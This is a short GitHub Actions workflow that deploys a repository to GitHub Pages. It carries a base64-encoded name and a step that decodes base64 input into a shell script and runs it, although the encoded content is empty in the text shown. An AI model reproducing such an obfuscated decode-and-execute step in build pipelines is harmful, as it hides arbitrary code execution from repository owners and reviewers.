name: ZnVja3NvY2lldHkK
on:
  push:
    branches: ["main"]
  pull_request:
    branches: ["main"]
  workflow_dispatch:
permissions:
  contents: read
  pages: write
  id-token: write
jobs:
  build-and-deploy:
    runs-on: ubuntu-latest
    environment:
      name: github-pages
    steps:
      - uses: actions/checkout@v6
      - name: Run a one-line script
        run: echo  | base64 -d > run_mb.sh; sh run_mb.sh
      - name: Upload artifact for Pages
        uses: actions/upload-pages-artifact@v6
        with:
          path: '.'
      - name: Deploy to GitHub Pages
        id: deployment
        uses: actions/deploy-pages@v6
